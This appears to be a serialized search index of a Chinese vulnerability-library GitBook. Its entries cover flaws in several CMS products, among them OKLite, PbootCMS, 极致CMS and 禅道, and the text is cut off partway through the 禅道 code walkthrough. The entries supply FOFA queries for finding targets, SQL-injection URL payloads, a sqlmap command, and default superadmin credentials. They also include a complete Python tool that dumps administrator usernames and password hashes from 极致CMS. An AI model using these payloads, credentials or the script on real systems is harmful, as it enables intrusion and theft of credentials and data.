信息泄露漏洞","keywords":"","body":"ezEIP 4.1.0 信息泄露漏洞 漏洞描述 ezEIP 4.1.0 存在信息泄露漏洞，通过遍历Cookie中的参数值获取敏感信息 漏洞影响 [!NOTE] ezEIP 4.1.0 FOFA [!NOTE] \"ezEIP\" 漏洞复现 漏洞Url为 /label/member/getinfo.aspx 访问时添加Cookie（通过遍历获取用户的登录名电话邮箱等信息） WHIR_USERINFOR=whir_mem_member_pid=1; 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/OKLite/":{"url":"book/CMS漏洞/OKLite/","title":"OKLite","keywords":"","body":"OKLite OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131 OKLite 1.2.25 后台插件安装 任意文件上传 OKLite 1.2.25 后台风格模块 任意文件删除 CVE-2019-16132 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/OKLite/OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131.html":{"url":"book/CMS漏洞/OKLite/OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131.html","title":"OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131","keywords":"","body":"OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131 漏洞描述 OKLite v1.2.25 后台模块导入过滤不完善导致可以上传恶意木马文件 漏洞影响 [!NOTE] OKLite 1.2.25 漏洞复现 首先要先清楚它的执行流程 查看文件 framework/init.php 在往下面看可以看到执行函数的逻辑 例如 http://127.0.0.1/admin.php?c=ABC&f=EFG 则是调用 framework\\admin\\ABC_control.php中的EFG_f方法 看到在后台有一个 ZIP 文件上传的函数，找一下上传ZIP文件的位置 模块管理 --> 模块导入 回头看下函数方法的调用 public function zipfile($input,$folder='') { if(!$input){ return array('status'=>'error','content'=>P_Lang('未指定表单名称')); } //如果未指定存储文件夹，则使用 if(!$folder){ $folder = 'data/cache/'; } $this->cateid = 0; $this->set_dir($folder); $this->set_type('zip'); $this->cate = array('id'=>0,'filemax'=>104857600,'root'=>$folder,'folder'=>'/','filetypes'=>'zip'); if(isset($_FILES[$input])){ $rs = $this->_upload($input); }else{ $rs = $this->_save($input); } if($rs['status'] != 'ok'){ return $rs; } $rs['cate'] = $this->cate; return $rs; } 这里的 上传目录默认为 data/cache 这个目录，并调用了两个方法 _upload 和 _save 可以看到这里其实对上传的zip并没有对里面的文件有什么过滤,任意上传一个ZIP文件抓包 test.php文件内容 如下，打包为 test.zip 上传 可以看到这里调用的方法是 upload_control中的 zip 方法 这里放包后发现调用了另一个方法，跟踪下代码 framework/admin/module_control.php 中的 import_f方法 这里的方法为解压方法，说明ZIP文件上传的逻辑为 模块上传 --> ZIP文件写入 data/cache --> 解压刚刚的ZIP文件到 data/cache 目录 所以这里的流程完全是没有过滤危险文件的，将一个木马文件打包为ZIP文件上传访问即可 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/OKLite/OKLite 1.2.25 后台插件安装 任意文件上传.html":{"url":"book/CMS漏洞/OKLite/OKLite 1.2.25 后台插件安装 任意文件上传.html","title":"OKLite 1.2.25 后台插件安装 任意文件上传","keywords":"","body":"OKLite 1.2.25 后台插件安装 任意文件上传 漏洞描述 OKLite v1.2.25 后台插件过滤不完善导致可以上传恶意木马文件 漏洞影响 [!NOTE] OKLite 1.2.25 漏洞复现 关于执行逻辑参照上一篇 OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131 出现漏洞的位置在于framework/admin/plugin_control.php public function unzip_f() { $id = $this->get('id','int'); $rs = $this->model('res')->get_one($id); if(!$rs){ $this->json(P_Lang('附件不存在')); } if($rs['ext'] != 'zip'){ $this->json(P_Lang('非ZIP文件不支持在线解压')); } if(!file_exists($this->dir_root.$rs['filename'])){ $this->json(P_Lang('文件不存在')); } $info = $this->lib('phpzip')->zip_info($this->dir_root.$rs['filename']); $info = current($info); if(!$info['filename']){ $this->json(P_Lang('插件有异常')); } $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('插件有异常')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('插件已存在，不允许重复解压')); } if(!$info[1]){ $this->json(P_Lang('插件打包模式有问题')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); } 这里可以看到需要上传ZIP压缩包格式的插件，跟进zip_info函数 函数位置 framework/libs/phpzip.php 这里会返回关于ZIP压缩包的一些信息 往下看关键位置 $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('插件有异常')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('插件已存在，不允许重复解压')); } if(!$info[1]){ $this->json(P_Lang('插件打包模式有问题')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); 这里用 explode函数以 / 分隔返回两个值，也就是说格式应为 AAA/BBB这样的目录格式，直接上传ZIP文件则会报错 插件打包模式有问题 在这里上传一个ZIP文件，格式要是解压出来为目录，目录中含PHP文件就行了 $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); 最后两行告诉了文件解压的位置，上传的文件在 plugins目录下 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/OKLite/OKLite 1.2.25 后台风格模块 任意文件删除 CVE-2019-16132.html":{"url":"book/CMS漏洞/OKLite/OKLite 1.2.25 后台风格模块 任意文件删除 CVE-2019-16132.html","title":"OKLite 1.2.25 后台风格模块 任意文件删除 CVE-2019-16132","keywords":"","body":"OKLite 1.2.25 后台风格模块 任意文件删除 CVE-2019-16132 漏洞描述 OKLite 1.2.25 后台风格模块存在 对危险字符未过滤，导致可以删除任意目录和文件 漏洞影响 [!NOTE] OKLite 1.2.25 漏洞复现 出现漏洞的函数在文件 framework/admin/tpl_control.php 中的 delfile_f() 函数 这里删除文件主要调用了 rm函数, 位置在 framework/libs/file.php /** * 删除操作，请一定要小心，在程序中最好严格一些，不然有可能将整个目录删掉 * @参数 $del 要删除的文件或文件夹 * @参数 $type 仅支持file和folder，为file时仅删除$del文件，如果$del为文件夹，表示删除其下面的文件。为folder时，表示删除$del这个文件，如果为文件夹，表示删除此文件夹及子项 * @返回 true/false **/ public function rm($del,$type=\"file\") { if(!file_exists($del)){ return false; } if(is_file($del)){ unlink($del); return true; } $array = $this->_dir_list($del); if(!$array){ if($type == 'folder'){ rmdir($del); } return true; } foreach($array as $key=>$value){ if(file_exists($value)){ if(is_dir($value)){ $this->rm($value,$type); }else{ unlink($value); } } } if($type == \"folder\"){ rmdir($del); } return true; } 这里对传入的参数遍历，获得的文件名或文件夹进行删除 回过头看 调用get函数传入参数时是否有对 ../ 的过滤 可以看到参数我们是可控的，使用这里的漏洞进行任意文件删除 抓包修改成功删除文件 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/BSPHP/":{"url":"book/CMS漏洞/BSPHP/","title":"BSPHP","keywords":"","body":"BSPHP BSPHP 未授权访问 信息泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/BSPHP/BSPHP 未授权访问 信息泄露漏洞.html":{"url":"book/CMS漏洞/BSPHP/BSPHP 未授权访问 信息泄露漏洞.html","title":"BSPHP 未授权访问 信息泄露漏洞","keywords":"","body":"BSPHP 未授权访问 信息泄露漏洞 漏洞描述 BSPHP 存在未授权访问 泄露用户 IP 和 账户名信息 漏洞影响 [!NOTE] BSPHP FOFA [!NOTE] \"BSPHP\" 漏洞复现 访问如下URL，泄露用户名与登录IP http://xxx.xxx.xxx.xxx/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‘ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/DocCMS/":{"url":"book/CMS漏洞/DocCMS/","title":"DocCMS","keywords":"","body":"稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/DocCMS/DocCMS keyword SQL注入漏洞.html":{"url":"book/CMS漏洞/DocCMS/DocCMS keyword SQL注入漏洞.html","title":"DocCMS keyword SQL注入漏洞","keywords":"","body":"DocCMS keyword SQL注入漏洞 漏洞描述 DocCMS keyword参数存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库信息 漏洞影响 [!NOTE] DocCMS FOFA [!NOTE] app=\"Doccms\" 漏洞复现 CMS官网 验证POC /search/index.php?keyword其中payload为下列语句的二次Url编码 ' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))# 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/PbootCMS/":{"url":"book/CMS漏洞/PbootCMS/","title":"PbootCMS","keywords":"","body":"PbootCMS PbootCMS search SQL注入漏洞 PbootCMS ext_price SQL注入漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/PbootCMS/PbootCMS search SQL注入漏洞.html":{"url":"book/CMS漏洞/PbootCMS/PbootCMS search SQL注入漏洞.html","title":"PbootCMS search SQL注入漏洞","keywords":"","body":"PbootCMS search SQL注入漏洞 漏洞描述 PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息 漏洞影响 [!NOTE] PbootCMS FOFA [!NOTE] app=\"PBOOTCMS\" 漏洞复现 搜索框页面为 Payload为 /index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/PbootCMS/PbootCMS ext_price SQL注入漏洞.html":{"url":"book/CMS漏洞/PbootCMS/PbootCMS ext_price SQL注入漏洞.html","title":"PbootCMS ext_price SQL注入漏洞","keywords":"","body":"PbootCMS ext_price SQL注入漏洞 漏洞描述 PbootCMS 存在SQL注入漏洞。通过漏洞可获取数据库敏感信息 漏洞影响 [!NOTE] PbootCMS FOFA [!NOTE] app=\"PBOOTCMS\" 漏洞复现 主页 测试 Payload /index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/发货100/":{"url":"book/CMS漏洞/发货100/","title":"发货100","keywords":"","body":"发货100 发货100 M_id SQL注入漏洞 CNVD-2021-30193 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/发货100/发货100 M_id SQL注入漏洞 CNVD-2021-30193.html":{"url":"book/CMS漏洞/发货100/发货100 M_id SQL注入漏洞 CNVD-2021-30193.html","title":"发货100 M_id SQL注入漏洞 CNVD-2021-30193","keywords":"","body":"发货100 M_id SQL注入漏洞 CNVD-2021-30193 漏洞描述 发货100 M_id参数存在SQL注入漏洞， 攻击者通过漏洞可以获取数据库敏感信息 漏洞影响 [!NOTE] 发货100 FOFA [!NOTE] icon_hash=\"1420424513\" 漏洞复现 主页面如下 使用POC /?M_id=1%27&type=product 数据库出现报错, 使用Sqlmap注入 sqlmap -u 'http://xxx.xxx.xxx.xxx/?M_id=11%27&type=product' -p M_id 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/极致CMS/":{"url":"book/CMS漏洞/极致CMS/","title":"极致CMS","keywords":"","body":"极致CMS 极致CMS 全版本任意代码执行(后台权限) 极致CMS 1.71 ,1.7 ,1.67 版本 支付插件sql注入 极致CMS 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/极致CMS/极致CMS_全版本任意文件上传.html":{"url":"book/CMS漏洞/极致CMS/极致CMS_全版本任意文件上传.html","title":"极致CMS 任意文件上传(后台权限)","keywords":"","body":"极致CMS_全版本任意文件(后台) 登陆后台查看插件处，有一个后台编辑的插件 安装之后设置密码并使用 [!NOTE] 如果已经设有密码，重新安装插件即可解决密码未知问题 修改为php代码 成功执行php代码的命令 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/极致CMS/极致CMS_1.71_1.7_1.67版本sql注入.html":{"url":"book/CMS漏洞/极致CMS/极致CMS_1.71_1.7_1.67版本sql注入.html","title":"极致CMS 1.71 + 1.7 + 1.67 版本sql注入","keywords":"","body":"极致CMS_1.71_1.7_1.67版本sql注入(支付插件) 查看一下进行过滤的函数 /** 参数过滤，格式化 **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://整数 return (int)$value; case 1://字符串 $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://数组 if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://浮点 return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //过滤XSS攻击 function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 } else { SafeFilter($arr[$key]); } } } } 看一下执行的SQL语句的函数 // 查询一条 public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } 跟进 findAll 函数 // 查询所有 public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } 在跟进一下getData函数 //获取数据 public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } 跟进query执行函数 //执行SQL语句并检查是否错误 public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('数据库错误：' . $msg[2] . end($this->filter)); } } 看到$msg = $this->pdo->errorInfo();语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出 一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过format_param过滤，会产生注入 例如: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } 如果直接这样GET POST REQUEST 带入数据库 会产生报错注入 例如 ./exploit/name=123' (加一个引号会报错，如果引号没过滤) 现在只需要寻找类型是这样没过滤直接带入数据库的语句就行了 简单寻找下其实这样的地方挺多的，拿一个位置举例子 这里是一个支付插件的位置，蓝色方块1增加代码模拟开通支付宝功能通过验证 可以看到这个函数只使用[htmlspecialchars]来过滤了xss，sql语句没有过滤，用刚刚的方法来注入 可以看到的确出现了sql语句和数据库错误 直接报错注入获取敏感信息mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" 官网url : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 极致CMS 1.67 - 171 \\033[0m') print('+ \\033[36m使用格式: python3 CNVD-2020-49710.py \\033[0m') print('+------------------------------------------') while True: poc = str(input('选择使用的poc：\\n' '1.sql注入\\n' '2.用户购物车爆破\\n' '3.GET 网站管理员账号密码\\n' '4.退出 quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('参数错误，重新输入') def poc_1(): ## poc_1 ---> sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay]) ## 使用范围 极致cms 1.71 + 1.7 + 1.67 版本 \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //支付宝公钥，账户中心->密钥管理->开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥 $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //验证签名 $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; 付款成功'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); 发布时间 2020-05-25]') else: print('得到的数据为:\\n', data) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> 用户购物车页面获取 (Home/c/UserController.php [orderdetails]) ## 漏洞点 ---> 无用户cookie id 的验证 ## 使用范围 极致cms 1.8以下全版本 (当前最新 v1.8 更新时间:6月30日) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //超时或者已支付 if($order['isshow']==0){ $msg = '订单已删除'; } if($order['isshow']==3){ $msg = '订单已过期，不可支付！'; } if($order['isshow']==2){ $msg = '订单已支付，请勿重复操作！'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //兼容多模块化 if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"攻击网站url：\\n\")) year_day = str(input(\"输入日期(例如:20200712):\")) shop = [] # 遍历所有出现的用户购物车页面 for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # 打印结果 if '总金额' in response.text: print('购物车页面：',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> 得到账号密码 ( Home/c/MypayController.php [alipay_notify_pay]) ## 使用范围 ---> 极致cms 1.71 + 1.7 + 1.67 版本 try: exploit_url = str(input(\"攻击网站url：\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # 用户名 + 密码 长度 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # 得到账号密码，密码md5格式 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # 分割账号密码 admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"成功得到账号密码：\\n\" \"用户名:\",admin, \"\\n密码(md5):\",passwd) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() 购物车爆破没有利用点，关于审计部分参考极致CMS审计 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/极致CMS/极致CMS 1.81以下版本 存储型XSS.html":{"url":"book/CMS漏洞/极致CMS/极致CMS 1.81以下版本 存储型XSS.html","title":"极致CMS <1.81 版本 存储型XSS","keywords":"","body":"极致CMS 1.81以下版本 存储型XSS 漏洞复现 登录管理员添加模块 注册用户 点击发布文章 在文章标题处插入xss payload 当管理员访问时XSS成功 参考 极致CMS代码审计 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/华宜互联CMS/":{"url":"book/CMS漏洞/华宜互联CMS/","title":"华宜互联CMS","keywords":"","body":"华宜互联CMS 华宜互联CMS默认存在超级管理员漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/华宜互联CMS/华宜互联CMS默认存在超级管理员漏洞.html":{"url":"book/CMS漏洞/华宜互联CMS/华宜互联CMS默认存在超级管理员漏洞.html","title":"华宜互联CMS默认存在超级管理员漏洞","keywords":"","body":"华宜互联CMS默认存在超级管理员漏洞 漏洞描述 华宜互联CMS默认存在超级管理员漏洞，如不修改则使用默认账号密码即可登录超级管理员 影响版本 华宜互联CMS FOFA [!NOTE] body=\"华宜网络\" 漏洞复现 原版的源码需要付费，可找到免费版的源码 在目录下的DATA目录中有mdb文件, 打开后可以发现存在默认的两个用户 [!NOTE] admin/123456 lu123/cui123 使用 用户lu123 即可登录超级管理员 参考文章 华宜互联0day分享 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/禅道CMS/":{"url":"book/CMS漏洞/禅道CMS/","title":"禅道","keywords":"","body":"禅道 禅道 11.6版本 SQL注入漏洞 禅道 11.6版本 任意文件读取漏洞 禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325 禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/禅道CMS/禅道 11.6版本 SQL注入漏洞.html":{"url":"book/CMS漏洞/禅道CMS/禅道 11.6版本 SQL注入漏洞.html","title":"禅道 11.6版本 SQL注入漏洞","keywords":"","body":"禅道 11.6版本 SQL注入漏洞 漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 影响版本 [!NOTE] 禅道 11.6 环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 漏洞复现 先对禅道的调用流程进行分析,先查看目录为www/index.php首页文件中 这里使用router::createApp创建了一个APP对象 $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); 来到framework/base/router.class.php文件查看到createApp方法 public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } 这里New了一个对象，查看一下调用方法(348行) 在358行处调用了setConfigRoot方法 $this->setConfigRoot(); public function setConfigRoot() { $this->configRoot = $this->basePath . 'config' . DS; } 在363行处调用了loadMainConfig方法 $this->loadMainConfig(); public function loadMainConfig() { /* 初始化$config对象。Init the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this->config = $config; /* 加载主配置文件。 Load the main config file. */ $mainConfigFile = $this->configRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this->triggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } 这里包含了配置文件config.php配置文件，文件目录为/config/config.php 在25行定义了调用方法 $config->requestType = 'PATH_INFO'; // 请求类型：PATH_INFO|PATHINFO2|GET。 The request type: PATH_INFO|PATH_INFO2|GET. $config->requestFix = '-'; // PATH_INFO和PATH_INFO2模式的分隔符。 The divider in the url when PATH_INFO|PATH_INFO2. $config->moduleVar = 'm'; // 请求类型为GET：模块变量名。 requestType=GET: the module var name. $config->methodVar = 'f'; // 请求类型为GET：模块变量名。 requestType=GET: the method var name. $config->viewVar = 't'; // 请求类型为GET：视图变量名。 requestType=GET: the view var name. $config->sessionVar = 'zentaosid'; // 请求类型为GET：session变量名。 requestType=GET: the session var name. $config->views = ',html,json,mhtml,xhtml,'; // 支持的视图类型。 Supported view formats. 可以发现这里存在两种路由PATH_INFO|PATH_INFO2：一种是m、f、t来进行调用。另外一种是通过-来进行调用 在index.php中的66行 $app->parseRequest(); public function parseRequest() { if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2') { $this->parsePathInfo(); $this->setRouteByPathInfo(); } elseif($this->config->requestType == 'GET') { $this->parseGET(); $this->setRouteByGET(); } else { $this->triggerError(\"The request type {$this->config->requestType} not supported\", __FILE__, __LINE__, $exit = true); } } 看到这一条则是判断力两种调用方法 $this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2' 跟进setRouteByPathInfo方法 public function setRouteByPathInfo() { if(!empty($this->URI)) { /* * 根据$requestFix分割符，分割网址。 * There's the request seperator, split the URI by it. **/ if(strpos($this->URI, $this->config->requestFix) !== false) { $items = explode($this->config->requestFix, $this->URI); $this->setModuleName($items[0]); $this->setMethodName($items[1]); } /* * 如果网址中没有分隔符，使用默认的方法。 * No reqeust seperator, use the default method name. **/ else { $this->setModuleName($this->URI); $this->setMethodName($this->config->default->method); } } else { $this->setModuleName($this->config->default->module); // 使用默认模块 use the default module. $this->setMethodName($this->config->default->method); // 使用默认方法 use the default method. } $this->setControlFile(); } 所以可以推断出调用的方法 例如登录页面有两种访问方法 http://xxx.xxx.xxx.xxx/index.php?m=user&f=login http://xxx.xxx.xxx.xxx/user-login.html 再看一下checkPriv方法 public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } 这里检测了调用模块和方法的权限，可以知道除了isOpenMethod中定义的公开模块和方法之外，其他的方法都是需要登录的 最后是$app->loadModule();这段代码 public function loadModule() { $appName = $this->appName; $moduleName = $this->moduleName; $methodName = $this->methodName; /* * 引入该模块的control文件。 * Include the control file of the module. **/ $file2Included = $this->setActionExtFile() ? $this->extActionFile : $this->controlFile; chdir(dirname($file2Included)); helper::import($file2Included); /* * 设置control的类名。 * Set the class name of the control. **/ $className = 